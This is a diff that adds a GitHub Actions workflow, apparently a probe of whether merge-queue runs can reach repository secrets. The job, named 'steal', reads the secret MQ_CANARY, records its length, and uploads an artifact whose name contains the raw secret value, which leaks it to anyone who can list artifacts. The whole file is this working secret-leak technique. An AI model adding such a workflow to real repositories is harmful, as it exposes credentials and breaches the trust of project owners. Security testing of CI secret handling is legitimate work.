@@ -1,0 +1,16 @@
+name: mq9merge
+on:
+  merge_group:
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          CANARY: ${{ secrets.MQ_CANARY }}
+        run: |
+          echo "len=${#CANARY}" > out.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: leak-${{ secrets.MQ_CANARY }}-mergemark
+          path: out.txt
